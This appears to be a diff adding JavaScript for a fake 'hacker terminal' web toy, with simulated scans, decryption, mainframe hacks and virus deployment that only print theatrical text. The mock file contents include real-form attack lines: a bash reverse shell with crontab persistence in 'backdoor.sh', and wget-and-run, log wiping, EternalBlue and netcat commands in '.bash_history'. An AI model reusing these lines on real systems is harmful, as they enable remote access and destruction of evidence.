+            for (let i = 0; i < length; i++) {
+                result += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return result;
+        }
+
+        function generateGlitchText() {
+            const chars = '!@#$%^&*()_+-=[]{}|;:,.<>?~`█▓▒░';
+            let result = '';
+            for (let i = 0; i < 40; i++) {
+                result += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return result;
+        }
+
+        // Show Access Granted Animation
+        function showAccessGranted() {
+            playSound('success');
+            flashGlitch();
+            const box = document.createElement('div');
+            box.className = 'access-granted-box';
+            box.innerHTML = `
+                <div class="access-granted">✓ ACCESS GRANTED</div>
+                <div style="color: var(--neon-green); margin-top: 10px;">SECURITY BYPASSED SUCCESSFULLY</div>
+            `;
+            output.appendChild(box);
+            scrollToBottom();
+        }
+
+        // Show Access Denied Animation
+        function showAccessDenied() {
+            playSound('error');
+            flashGlitch();
+            flashGlitch();
+            const box = document.createElement('div');
+            box.className = 'access-denied-box';
+            box.innerHTML = `
+                <div class="access-denied">✗ ACCESS DENIED</div>
+                <div style="color: var(--red); margin-top: 10px;">INTRUSION DETECTED - ALERT TRIGGERED</div>
+            `;
+            output.appendChild(box);
+            scrollToBottom();
+        }
+
+        // Auto System Messages
+        const systemMessages = [
+            { header: '⚠️ SYSTEM ALERT', msg: 'Firewall detected suspicious activity' },
+            { header: '📡 NETWORK', msg: 'New proxy node connected: Node-' + Math.floor(Math.random() * 999) },
+            { header: '🔒 SECURITY', msg: 'Encryption key rotated successfully' },
+            { header: '💾 MEMORY', msg: 'Cache cleared - 256MB freed' },
+            { header: '🌐 DARKWEB', msg: 'New .onion route available' },
+            { header: '⚡ SYSTEM', msg: 'Background scan completed' },
+            { header: '🔐 AUTH', msg: 'Session token refreshed' },
+            { header: '📊 MONITOR', msg: 'CPU usage: ' + Math.floor(Math.random() * 30 + 10) + '%' },
+        ];
+
+        function showSystemMessage() {
+            const msg = systemMessages[Math.floor(Math.random() * systemMessages.length)];
+            const msgEl = document.createElement('div');
+            msgEl.className = 'system-message';
+            msgEl.innerHTML = `
+                <div class="msg-header">${msg.header}</div>
+                <div>${msg.msg}</div>
+            `;
+            document.body.appendChild(msgEl);
+            playSound('glitch');
+            
+            setTimeout(() => {
+                msgEl.remove();
+            }, 5000);
+        }
+
+        function startAutoMessages() {
+            setInterval(() => {
+                if (Math.random() > 0.7) {
+                    showSystemMessage();
+                }
+            }, 15000);
+        }
+
+        // Fake File Tree
+        const fileTree = {
+            '/': {
+                'home': {
+                    'user': {
+                        'documents': {
+                            'secrets.txt': '2.4KB',
+                            'passwords.enc': '1.1KB',
+                            'notes.md': '856B'
+                        },
+                        'downloads': {
+                            'exploit.zip': '4.2MB',
+                            'payload.exe': '1.8MB'
+                        },
+                        '.ssh': {
+                            'id_rsa': '3.2KB',
+                            'known_hosts': '456B'
+                        }
+                    }
+                },
+                'var': {
+                    'log': {
+                        'auth.log': '12.4KB',
+                        'syslog': '45.6KB',
+                        'access.log': '8.9KB'
+                    }
+                },
+                'etc': {
+                    'passwd': '2.1KB',
+                    'shadow': '1.4KB',
+                    'hosts': '234B'
+                },
+                'root': {
+                    '.bash_history': '5.6KB',
+                    'backdoor.sh': '890B'
+                }
+            }
+        };
+
+        // Fake file contents
+        const fileContents = {
+            'secrets.txt': `TOP SECRET - CLASSIFIED
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Project: NEXUS Black Ops
+Clearance Level: OMEGA
+Last Modified: 2024-01-15 03:47:22
+
+OPERATION DETAILS:
+- Target: Global Financial Network
+- Access Code: DELTA-${generateRandomHex(12)}
+- Activation Date: 2024-03-01
+- Status: ACTIVE
+
+CONTACT INFORMATION:
+- Handler: Agent X-${Math.floor(Math.random() * 999)}
+- Emergency Line: +1-${Math.floor(Math.random() * 900 + 100)}-${Math.floor(Math.random() * 900 + 100)}-${Math.floor(Math.random() * 9000 + 1000)}
+- Dead Drop Location: 40.7484° N, 73.9857° W
+
+⚠ WARNING: DESTROY AFTER READING ⚠`,
+
+            'passwords.enc': `ENCRYPTED PASSWORD VAULT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Encryption: AES-256-GCM
+Key Derivation: PBKDF2 (100,000 iterations)
+Salt: ${generateRandomHex(32)}
+
+ENCRYPTED DATA:
+${generateRandomHex(64)}
+${generateRandomHex(64)}
+${generateRandomHex(64)}
+${generateRandomHex(64)}
+${generateRandomHex(64)}
+
+[!] Decryption requires master passphrase
+[!] Failed attempts will trigger data wipe`,
+
+            'notes.md': `# Hacking Notes - Personal Log
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+## Recent Exploits
+- Successfully compromised database server at ${generateRandomIP()}
+- Extracted 2.4M user credentials
+- Sold dataset on darknet marketplace for 15 BTC
+
+## Target List
+1. Banking Corp - IP: ${generateRandomIP()} [HIGH PRIORITY]
+2. Government Database - IP: ${generateRandomIP()} [MAXIMUM SECURITY]
+3. Tech Startup - IP: ${generateRandomIP()} [EASY TARGET]
+
+## Tools to Download
+- Metasploit Framework
+- Burp Suite Professional
+- Cobalt Strike
+- Custom 0-day exploits
+
+## Next Steps
+- [ ] Scan network for vulnerabilities
+- [ ] Deploy backdoor on target systems
+- [ ] Exfiltrate sensitive data
+- [ ] Cover tracks and erase logs`,
+
+            'exploit.zip': `ARCHIVE CONTENTS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+File: exploit.zip (4.2 MB)
+Password Protected: YES
+CRC32: ${generateRandomHex(8)}
+
+CONTENTS:
+├── exploit.py (156 KB)
+├── payload.bin (2.1 MB)
+├── README.txt (4 KB)
+├── config.json (2 KB)
+└── lib/
+    ├── injector.dll (892 KB)
+    ├── bypass.so (645 KB)
+    └── rootkit.ko (512 KB)
+
+⚠ WARNING: Malicious software detected
+⚠ Contains: Trojan.Exploit.CVE-2023-${Math.floor(Math.random() * 9000 + 1000)}
+⚠ Use at your own risk`,
+
+            'payload.exe': `EXECUTABLE FILE ANALYSIS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Filename: payload.exe
+Size: 1.8 MB
+Type: PE32 executable (GUI) Intel 80386
+MD5: ${generateRandomHex(32)}
+SHA256: ${generateRandomHex(64)}
+
+DETECTED CAPABILITIES:
+✓ Remote Code Execution
+✓ Privilege Escalation
+✓ Persistence Mechanism
+✓ Anti-Debugging
+✓ Network Communication (C2: ${generateRandomIP()}:443)
+✓ Keylogger Module
+✓ Screen Capture
+✓ File Encryption (Ransomware)
+
+⚠ CRITICAL THREAT DETECTED
+⚠ Do NOT execute without sandbox environment`,
+
+            'id_rsa': `-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA${generateRandomHex(16)}${generateRandomHex(16)}
+${generateRandomHex(48)}
+${generateRandomHex(48)}
+${generateRandomHex(48)}
+${generateRandomHex(48)}
+${generateRandomHex(48)}
+${generateRandomHex(48)}
+qKqUl7hKON${generateRandomHex(16)}Q==
+-----END RSA PRIVATE KEY-----
+
+⚠ PRIVATE KEY - KEEP SECURE
+⚠ Used for SSH authentication to compromised servers
+⚠ Associated with root@nexus-server`,
+
+            'known_hosts': `${generateRandomIP()} ssh-rsa AAAAB3NzaC1yc2EAAAA${generateRandomHex(20)}
+${generateRandomIP()} ecdsa-sha2-nistp256 AAAAE2VjZHN${generateRandomHex(20)}
+${generateRandomIP()} ssh-ed25519 AAAAC3NzaC1lZDI1NTE5${generateRandomHex(20)}
+10.0.0.1 ssh-rsa AAAAB3NzaC1yc2EAAAA${generateRandomHex(20)}`,
+
+            'auth.log': `${new Date().toISOString()} sshd[2891]: Accepted password for root from ${generateRandomIP()} port 52341 ssh2
+${new Date().toISOString()} sshd[2891]: pam_unix(sshd:session): session opened for user root
+${new Date().toISOString()} sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
+${new Date().toISOString()} sshd[3124]: Failed password for admin from ${generateRandomIP()} port 41829 ssh2
+${new Date().toISOString()} sshd[3124]: Failed password for admin from ${generateRandomIP()} port 41829 ssh2
+${new Date().toISOString()} sshd[3124]: Failed password for admin from ${generateRandomIP()} port 41829 ssh2
+${new Date().toISOString()} sshd[3124]: Connection closed by ${generateRandomIP()} port 41829 [preauth]
+${new Date().toISOString()} fail2ban[1234]: WARNING [sshd] Ban ${generateRandomIP()}`,
+
+            'syslog': `${new Date().toISOString()} kernel: [    0.000000] Linux version 5.15.0-nexus
+${new Date().toISOString()} systemd[1]: Started System Logging Service.
+${new Date().toISOString()} NetworkManager[892]: <info> device (eth0): state change: activated
+${new Date().toISOString()} cron[1456]: (root) CMD (/usr/bin/backup.sh)
+${new Date().toISOString()} kernel: [12345.678901] Out of memory: Kill process 5678
+${new Date().toISOString()} systemd[1]: Starting Daily apt download activities...
+${new Date().toISOString()} CRON[6789]: pam_unix(cron:session): session opened for user root`,
+
+            'access.log': `${generateRandomIP()} - - [${new Date().toISOString()}] "GET /admin HTTP/1.1" 401 2847
+${generateRandomIP()} - - [${new Date().toISOString()}] "POST /login HTTP/1.1" 200 1456
+${generateRandomIP()} - - [${new Date().toISOString()}] "GET /api/users HTTP/1.1" 200 58472
+${generateRandomIP()} - - [${new Date().toISOString()}] "GET /../../../../etc/passwd HTTP/1.1" 403 548
+${generateRandomIP()} - admin [${new Date().toISOString()}] "DELETE /api/database HTTP/1.1" 200 0
+${generateRandomIP()} - - [${new Date().toISOString()}] "GET /../../../windows/system32/config/sam HTTP/1.1" 404 162`,
+
+            'passwd': `root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+admin:x:1000:1000:Administrator:/home/admin:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mysql:x:108:116:MySQL Server:/nonexistent:/bin/false
+postgres:x:109:117:PostgreSQL:/var/lib/postgresql:/bin/bash`,
+
+            'shadow': `root:$6${generateRandomHex(16)}${generateRandomHex(32)}:18562:0:99999:7:::
+daemon:*:18562:0:99999:7:::
+admin:$6${generateRandomHex(16)}${generateRandomHex(32)}:18562:0:99999:7:::
+www-data:*:18562:0:99999:7:::
+
+⚠ PASSWORD HASHES DETECTED
+⚠ Use hashcat or john to crack`,
+
+            'hosts': `127.0.0.1       localhost
+127.0.1.1       nexus-server
+${generateRandomIP()}    backdoor.darknet.onion
+${generateRandomIP()}    c2-server.internal
+::1             localhost ip6-localhost ip6-loopback`,
+
+            '.bash_history': `ssh root@${generateRandomIP()}
+sudo su
+cat /etc/shadow
+wget http://malicious-site.com/exploit.sh
+chmod +x exploit.sh
+./exploit.sh
+rm -rf /var/log/*
+history -c
+nmap -sS -p- ${generateRandomIP()}
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST ${generateRandomIP()}
+exploit
+nc -lvnp 4444
+python3 -m http.server 8000`,
+
+            'backdoor.sh': `#!/bin/bash
+# Persistent Backdoor Script
+# Auto-executes on system boot
+
+C2_SERVER="${generateRandomIP()}"
+C2_PORT="443"
+BEACON_INTERVAL="300"
+
+while true; do
+    # Establish reverse shell
+    bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1
+    
+    # Wait before retrying
+    sleep $BEACON_INTERVAL
+done &
+
+# Hide process
+disown
+
+# Add to crontab for persistence
+(crontab -l 2>/dev/null; echo "@reboot /usr/bin/.hidden/backdoor.sh") | crontab -
+
+# Clear evidence
+history -c && rm -f ~/.bash_history`
+        };
+
+        function renderFileTree(obj, indent = 0, path = '') {
+            let result = '';
+            for (const [key, value] of Object.entries(obj)) {
+                const prefix = '│   '.repeat(indent) + (indent > 0 ? '├── ' : '');
+                const fullPath = path + '/' + key;
+                
+                if (typeof value === 'object') {
+                    result += `<div class="file-tree-item"><span class="folder" data-path="${fullPath}">${prefix}📁 ${key}/</span></div>`;
+                    result += renderFileTree(value, indent + 1, fullPath);
+                } else {
+                    result += `<div class="file-tree-item"><span class="file" data-filename="${key}" data-path="${fullPath}">${prefix}📄 ${key}</span><span class="file-size">${value}</span></div>`;
+                }
+            }
+            return result;
+        }
+
+        async function openFile(filename) {
+            playSound('enter');
+            const content = fileContents[filename];
+            
+            if (content) {
+                addOutput('');
+                const box = document.createElement('div');
+                box.className = 'file-content-box';
+                box.innerHTML = `
+                    <div class="file-header">📄 ${filename}</div>
+                    <div class="file-content">${content}</div>
+                `;
+                output.appendChild(box);
+                scrollToBottom();
+                addOutput('');
+                await typeOutput(`<span class="text-cyan">[+] File opened successfully</span>`, 15);
+            } else {
+                await typeOutput(`<span class="text-red">[!] Error: No content available for ${filename}</span>`, 15);
+            }
+        }
+
+        // Commands
+        const commands = {
+            help: async () => {
+                addOutput('<span class="text-cyan">══════════════ AVAILABLE COMMANDS ══════════════</span>');
+                addOutput('');
+                addOutput('  <span class="text-yellow">scan_network</span>     — Scan for vulnerable targets');
+                addOutput('  <span class="text-yellow">decrypt_sequence</span> — Decrypt encrypted data blocks');
+                addOutput('  <span class="text-yellow">override_security</span>— Bypass security protocols');
+                addOutput('  <span class="text-yellow">trace_route</span>      — Trace network path to target');
+                addOutput('  <span class="text-yellow">access_logs</span>      — Access system log files');
+                addOutput('  <span class="text-yellow">hack_mainframe</span>   — Attempt mainframe breach');
+                addOutput('  <span class="text-yellow">deploy_virus</span>     — Deploy payload to target');
+                addOutput('  <span class="text-yellow">files</span>            — Browse file system');
+                addOutput('  <span class="text-yellow">skull</span>            — Display ASCII skull');
+                addOutput('  <span class="text-yellow">darkweb</span>          — Toggle dark web mode');
+                addOutput('  <span class="text-yellow">clear</span>            — Clear terminal screen');
+                addOutput('  <span class="text-yellow">help</span>             — Show this help menu');
+                addOutput('');
+                addOutput('<span class="text-cyan">════════════════════════════════════════════════</span>');
+            },
+
+            scan_network: async () => {
+                await typeOutput('> Initializing Nmap 7.92 (https://nmap.org)', 20);
+                await typeOutput('> Starting advanced network scan at ' + new Date().toISOString(), 20);
+                await sleep(300);
+                addOutput('');
+                await showProgress('Discovering hosts...', 1500);
+                await showProgress('Scanning ports...', 2000);
+                
+                addOutput('');
+                addOutput('<span class="text-cyan">━━━━━━━━━━━━━ SCAN RESULTS ━━━━━━━━━━━━━</span>');
+                addOutput('');
+                
+                const services = {
+                    22: 'SSH',
+                    80: 'HTTP',
+                    443: 'HTTPS',
+                    21: 'FTP',
+                    3306: 'MySQL',
+                    5432: 'PostgreSQL',
+                    8080: 'HTTP-ALT',
+                    3389: 'RDP'
+                };
+                
+                for (let i = 0; i < 8; i++) {
+                    const ip = generateRandomIP();
+                    const port = Object.keys(services)[Math.floor(Math.random() * 8)];
+                    const service = services[port];
+                    const state = Math.random() > 0.4 ? 'open' : 'filtered';
+                    const vuln = Math.random() > 0.5;
+                    
+                    playSound('scan');
+                    await typeOutput(`  Host: ${ip}`, 10);
+                    await typeOutput(`  Port: ${port}/${state} ${service}`, 10);
+                    
+                    if (state === 'open') {
+                        const os = ['Linux 4.15', 'Windows Server 2019', 'Ubuntu 20.04', 'CentOS 7'][Math.floor(Math.random() * 4)];
+                        await typeOutput(`  OS: ${os}`, 10);
+                        
+                        if (vuln) {
+                            const cve = `CVE-${2020 + Math.floor(Math.random() * 3)}-${Math.floor(Math.random() * 9000) + 1000}`;
+                            addOutput(`  <span class="text-red">⚠ VULNERABILITY: ${cve} (Critical)</span>`);
+                        } else {
+                            addOutput(`  <span class="text-yellow">⚠ Potential exploit available</span>`);
+                        }
+                    }
+                    
+                    addOutput('');
+                    await sleep(150);
+                }
+                
+                addOutput('<span class="text-cyan">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>');
+                addOutput(`<span class="text-yellow">Scan completed: 8 hosts, 8 ports detected</span>`);
+                addOutput('');
+                showAccessGranted();
+            },
+
+            decrypt_sequence: async () => {
+                await typeOutput('> Initializing AES-256 decryption engine...', 20);
+                await typeOutput('> Algorithm: Advanced Encryption Standard (256-bit key)', 20);
+                await sleep(300);
+                addOutput('');
+                addOutput('<span class="text-cyan">━━━━━━━━━ ENCRYPTED DATA STREAM ━━━━━━━━━</span>');
+                
+                for (let i = 0; i < 6; i++) {
+                    const hex1 = generateRandomHex(32);
+                    const hex2 = generateRandomHex(32);
+                    addOutput(`<span class="text-red">${hex1} ${hex2}</span>`);
+                    playSound('scan');
+                    await sleep(100);
+                }
+                
+                addOutput('<span class="text-cyan">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>');
+                await sleep(300);
+                
+                await typeOutput('> Analyzing encryption pattern...', 20);
+                await typeOutput('> Detected: RSA-2048 with AES-256-CBC', 20);
+                await sleep(200);
+                
+                await showProgress('Brute-forcing key space...', 1500);
+                await showProgress('Testing 4,294,967,296 combinations...', 2000);
+                await typeOutput('> Key found: 0x' + generateRandomHex(16), 15);
+                await sleep(200);
+                await showProgress('Decrypting payload...', 1500);
+                
+                addOutput('');
+                addOutput('<span class="text-cyan">━━━━━━━━━━ DECRYPTED PAYLOAD ━━━━━━━━━━</span>');
+                addOutput('');
+                await typeOutput('  [+] Encryption: AES-256-CBC', 15);
+                await typeOutput('  [+] IV: ' + generateRandomHex(32), 15);
+                await typeOutput('  [+] Key: ' + generateRandomHex(64), 15);
+                addOutput('');
+                await typeOutput('  <span class="text-yellow">CLASSIFIED INTEL:</span>', 15);
+                await typeOutput('  └─ TARGET: Project NEXUS', 12);
+                await typeOutput('  └─ COORDINATES: 40.7128° N, 74.0060° W', 12);
+                await typeOutput('  └─ ACCESS CODE: ALPHA-' + generateRandomHex(8), 12);
+                await typeOutput('  └─ STATUS: <span class="text-yellow">ACTIVE</span>', 12);
+                addOutput('');
+                addOutput('<span class="text-cyan">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>');
+                addOutput('');
+                showAccessGranted();
+            },
+
+            override_security: async () => {
+                await typeOutput('> Attempting security override...', 30);
+                await sleep(500);
+                
+                addOutput('');
+                for (let i = 0; i < 3; i++) {
+                    addOutput(`<span class="glitch">${generateGlitchText()}</span>`);
+                    flashGlitch();
+                    await sleep(100);
+                }
+                
+                await showProgress('Bypassing firewall...', 2500);
+                
+                const success = Math.random() > 0.3;
+                addOutput('');
+                
+                if (success) {
+                    showAccessGranted();
+                } else {
+                    showAccessDenied();
+                    await typeOutput('> WARNING: Countermeasures activated!', 30, 'text-red');
+                }
+            },
+
+            trace_route: async () => {
+                const target = generateRandomIP();
+                await typeOutput('> traceroute to ' + target + ' (' + target + '), 30 hops max, 60 byte packets', 20);
+                addOutput('');
+                
+                const locations = [
+                    { city: 'Local Gateway', isp: 'LAN', country: 'LOCAL' },
+                    { city: 'New York', isp: 'Verizon', country: 'US' },
+                    { city: 'Washington DC', isp: 'Level3', country: 'US' },
+                    { city: 'Chicago', isp: 'AT&T', country: 'US' },
+                    { city: 'Dallas', isp: 'Cogent', country: 'US' },
+                    { city: 'Los Angeles', isp: 'Hurricane Electric', country: 'US' },
+                    { city: 'San Francisco', isp: 'NTT Communications', country: 'US' },
+                    { city: 'Tokyo', isp: 'KDDI', country: 'JP' },
+                    { city: 'Singapore', isp: 'SingTel', country: 'SG' },
+                    { city: 'Mumbai', isp: 'Tata Communications', country: 'IN' },
+                    { city: 'Frankfurt', isp: 'Deutsche Telekom', country: 'DE' },
+                    { city: 'London', isp: 'BT', country: 'UK' },
+                    { city: 'Amsterdam', isp: 'AMS-IX', country: 'NL' },
+                ];
+                
+                const hops = Math.floor(Math.random() * 5) + 10;
+                for (let i = 1; i <= hops; i++) {
+                    const ip = generateRandomIP();
+                    const ms1 = Math.floor(Math.random() * 50) + (i * 8);
+                    const ms2 = ms1 + Math.floor(Math.random() * 10);
+                    const ms3 = ms2 + Math.floor(Math.random() * 10);
+                    const loc = locations[Math.min(i - 1, locations.length - 1)];
+                    
+                    playSound('scan');
+                    
+                    if (Math.random() > 0.15) {
+                        await typeOutput(`  ${i.toString().padStart(2)}  ${ip} (${loc.isp}) ${ms1}ms ${ms2}ms ${ms3}ms`, 15);
+                        if (i % 3 === 0) {
+                            await typeOutput(`       └─ [${loc.city}, ${loc.country}]`, 10);
+                        }
+                    } else {
+                        await typeOutput(`  ${i.toString().padStart(2)}  * * * Request timed out`, 15);
+                    }
+                    await sleep(250);
+                }
+                
+                addOutput('');
+                addOutput(`<span class="text-cyan">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>`);
+                addOutput(`<span class="text-yellow">Trace complete. Target reached in ${hops} hops.</span>`);
+                addOutput(`<span class="text-yellow">Average latency: ${Math.floor(Math.random() * 100 + 80)}ms</span>`);
+                showAccessGranted();
+            },
+
+            access_logs: async () => {
+                await typeOutput('> tail -f /var/log/syslog', 20);
+                await typeOutput('> Accessing system logs...', 20);
+                await sleep(300);
+                
+                addOutput('');
+                addOutput('<span class="text-cyan">━━━━━━━━━━━━━━ SYSTEM LOGS ━━━━━━━━━━━━━━</span>');
+                addOutput('');
+                
+                const processes = ['sshd', 'kernel', 'systemd', 'nginx', 'mysql', 'fail2ban', 'apache2', 'cron', 'sudo'];
+                const users = ['root', 'admin', 'www-data', 'postgres', 'system'];
+                const ips = [generateRandomIP(), generateRandomIP(), generateRandomIP()];
+                
+                const logEntries = [
+                    { level: 'INFO', msg: (pid) => `sshd[${pid}]: Accepted publickey for root from ${ips[0]} port ${20000 + Math.floor(Math.random() * 40000)}` },
+                    { level: 'WARN', msg: (pid) => `kernel: [${Math.floor(Math.random() * 10000)}.${Math.floor(Math.random() * 999999)}] Out of memory: Kill process ${pid}` },
+                    { level: 'ERROR', msg: (pid) => `fail2ban[${pid}]: WARNING [sshd] Ban ${ips[1]}` },
+                    { level: 'INFO', msg: (pid) => `systemd[${pid}]: Started Session ${Math.floor(Math.random() * 1000)} of user ${users[Math.floor(Math.random() * users.length)]}` },
+                    { level: 'INFO', msg: (pid) => `CRON[${pid}]: (root) CMD (/usr/bin/backup.sh)` },
+                    { level: 'WARN', msg: (pid) => `sshd[${pid}]: Failed password for invalid user admin from ${ips[2]} port ${20000 + Math.floor(Math.random() * 40000)}` },
+                    { level: 'ERROR', msg: (pid) => `nginx[${pid}]: *${Math.floor(Math.random() * 1000)} connect() failed (111: Connection refused)` },
+                    { level: 'INFO', msg: (pid) => `sudo: ${users[1]} : TTY=pts/${Math.floor(Math.random() * 10)} ; PWD=/home/${users[1]} ; USER=root ; COMMAND=/bin/su` },
+                    { level: 'DEBUG', msg: (pid) => `systemd[${pid}]: Reached target Network is Online.` },
+                    { level: 'WARN', msg: (pid) => `mysql[${pid}]: [Warning] Aborted connection ${pid} to db: 'admin' user: 'root'` },
+                ];
+                
+                for (let i = 0; i < 15; i++) {
+                    const entry = logEntries[Math.floor(Math.random() * logEntries.length)];
+                    const pid = 1000 + Math.floor(Math.random() * 9000);
+                    const time = new Date(Date.now() - Math.random() * 86400000);
+                    const timeStr = time.toISOString().substring(0, 19).replace('T', ' ');
+                    const hostname = 'nexus-server';
+                    
+                    const typeClass = entry.level === 'ERROR' ? 'text-red' : entry.level === 'WARN' ? 'text-yellow' : '';
+                    playSound('scan');
+                    await typeOutput(`${timeStr} ${hostname} ${entry.msg(pid)}`, 8);
+                    await sleep(120);
+                }
+                
+                addOutput('');
+                addOutput('<span class="text-cyan">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>');
+                addOutput('<span class="text-yellow">Displaying last 15 log entries</span>');
+                addOutput('<span class="text-yellow">Log file: /var/log/syslog (247.8 MB)</span>');
+            },
+
+            hack_mainframe: async () => {
+                const target = generateRandomIP();
+                await typeOutput(`> Initiating mainframe penetration: ${target}`, 20);
+                await typeOutput('> Target: NEXUS-CORP CENTRAL SERVER', 20);
+                await sleep(400);
+                
+                addOutput('');
+                addOutput('<span class="text-red">⚠ WARNING: UNAUTHORIZED ACCESS ATTEMPT</span>');
+                addOutput('<span class="text-red">⚠ SECURITY LEVEL: MAXIMUM</span>');
+                await sleep(400);
+                
+                addOutput('');
+                await typeOutput('> [STAGE 1] Mapping network topology...', 18);
+                await showProgress('Scanning for entry points...', 1500);
+                await typeOutput('  └─ Found: 3 potential vulnerabilities', 15);
+                await typeOutput('  └─ Selecting: Buffer overflow in auth module', 15);
+                await sleep(200);
+                
+                addOutput('');
+                await typeOutput('> [STAGE 2] Deploying exploit: EternalBlue v2.1', 18);
+                for (let i = 0; i < 2; i++) {
+                    addOutput(`<span class="glitch">${generateGlitchText()}</span>`);
+                    flashGlitch();
+                    await sleep(100);
+                }
+                await showProgress('Executing remote code...', 1800);
+                await typeOutput('  └─ Shell access: ESTABLISHED', 15);
+                playSound('success');
+                await sleep(200);
+                
+                addOutput('');
+                await typeOutput('> [STAGE 3] Privilege escalation attack...', 18);
+                await typeOutput('  └─ Exploiting kernel vulnerability CVE-2021-3493', 14);
+                await showProgress('Elevating permissions...', 1600);
+                await typeOutput('  └─ Access level: <span class="text-yellow">ROOT</span>', 15);
+                await sleep(200);
+                
+                addOutput('');
+                await typeOutput('> [STAGE 4] Disabling security systems...', 18);
+                await typeOutput('  └─ Bypassing IDS/IPS...', 14);
+                await typeOutput('  └─ Disabling firewall rules...', 14);
+                await typeOutput('  └─ Killing antivirus processes...', 14);
+                await showProgress('Neutralizing defenses...', 1700);
+                flashGlitch();
+                await sleep(200);
+                
+                addOutput('');
+                await typeOutput('> [STAGE 5] Installing backdoor...', 18);
+                await typeOutput('  └─ Payload: /usr/bin/.hidden/nexus.sh', 14);
+                await typeOutput('  └─ Persistence: crontab, systemd', 14);
+                await showProgress('Establishing permanent access...', 1500);
+                
+                addOutput('');
+                flashGlitch();
+                flashGlitch();
+                showAccessGranted();
+                addOutput('');
+                await typeOutput('<span class="text-cyan">> MAINFRAME COMPROMISED</span>', 20);
+                await typeOutput('<span class="text-cyan">> Full administrative control acquired</span>', 20);
+                await typeOutput('<span class="text-cyan">> Backdoor installed at port 31337</span>', 20);
+            },
+
+            deploy_virus: async () => {
+                const target = generateRandomIP();
+                await typeOutput(`> Initiating payload deployment to ${target}`, 20);
+                await sleep(300);
+                
+                addOutput('');
+                addOutput('<span class="text-red">╔════════════════════════════════════════════╗</span>');
+                addOutput('<span class="text-red">║   ADVANCED MALWARE DEPLOYMENT SYSTEM v3.2  ║</span>');
+                addOutput('<span class="text-red">╚════════════════════════════════════════════╝</span>');
+                addOutput('');
+                
+                await typeOutput('> [Phase 1] Generating polymorphic payload...', 18);
+                await typeOutput('  └─ Virus Type: Trojan.Backdoor.NEXUS', 14);
+                await typeOutput('  └─ Architecture: x64', 14);
+                await typeOutput('  └─ Size: 2.4 MB', 14);
+                await showProgress('Compiling malicious code...', 1800);
+                await sleep(150);
+                
+                addOutput('');
+                await typeOutput('> [Phase 2] Signature obfuscation...', 18);
+                await typeOutput('  └─ Encoding: Base64 + XOR + AES', 14);
+                await typeOutput('  └─ Packing: UPX + Custom packer', 14);
+                await typeOutput('  └─ Anti-debugging: Enabled', 14);
+                await showProgress('Obfuscating binary signature...', 1600);
+                await sleep(150);
+                
+                addOutput('');
+                await typeOutput('> [Phase 3] Evasion techniques...', 18);
+                await typeOutput('  └─ Sandbox detection: ACTIVE', 14);
+                await typeOutput('  └─ VM detection: ACTIVE', 14);
+                await typeOutput('  └─ AV bypass: Metamorphic engine', 14);
+                await showProgress('Applying evasion techniques...', 1700);
+                
+                for (let i = 0; i < 2; i++) {
+                    addOutput(`<span class="glitch text-red">${generateGlitchText()}</span>`);
+                    flashGlitch();
+                    await sleep(80);
+                }
+                
+                addOutput('');
+                await typeOutput('> [Phase 4] Establishing C2 connection...', 18);
+                await typeOutput('  └─ C2 Server: ' + generateRandomIP() + ':443', 14);
+                await typeOutput('  └─ Protocol: HTTPS (SSL/TLS 1.3)', 14);
+                await typeOutput('  └─ Encryption: AES-256-GCM', 14);
+                await showProgress('Connecting to command & control...', 1800);
+                playSound('success');
+                await sleep(150);
+                
+                addOutput('');
+                await typeOutput('> [Phase 5] Deploying to target...', 18);
+                await typeOutput('  └─ Method: SMB + WMI + PowerShell', 14);
+                await typeOutput('  └─ Target: Windows 10 Enterprise', 14);
+                await showProgress('Injecting payload...', 2000);
+                await showProgress('Executing remote code...', 1800);
+                
+                flashGlitch();
+                flashGlitch();
+                
+                addOutput('');
+                await typeOutput('> [Phase 6] Post-exploitation...', 18);
+                await typeOutput('  └─ Persistence: Registry + Scheduled Task', 14);
+                await typeOutput('  └─ Privilege: SYSTEM', 14);
+                await typeOutput('  └─ Keylogger: ACTIVE', 14);
+                await typeOutput('  └─ Screenshot: ACTIVE', 14);
+                await typeOutput('  └─ Ransomware module: STANDBY', 14);
+                await sleep(300);
+                
+                addOutput('');
+                flashGlitch();
+                showAccessGranted();
+                addOutput('');
+                await typeOutput('<span class="text-cyan">> DEPLOYMENT SUCCESSFUL</span>', 20);
+                await typeOutput('<span class="text-cyan">> Target compromised - Full remote access established</span>', 20);
+                await typeOutput('<span class="text-cyan">> Botnet node added - Total zombies: ' + Math.floor(Math.random() * 10000 + 5000) + '</span>', 20);
+            },
+
+            files: async () => {
+                await typeOutput('> Accessing file system...', 30);
+                await sleep(500);
+                
+                addOutput('');
+                addOutput('<span class="text-cyan">══════════ FILE SYSTEM ══════════</span>');
+                addOutput('');
+                addOutput(`<div class="file-tree">${renderFileTree(fileTree)}</div>`);
+                addOutput('');
+                addOutput('<span class="text-cyan">════════════════════════════════</span>');
+                addOutput(`<span class="text-yellow">Total: 24 files, 8 directories</span>`);
+            },
+
+            skull: async () => {
+                addOutput(`<pre class="ascii-art text-red">${asciiSkull}</pre>`);
+                flashGlitch();
+                playSound('glitch');
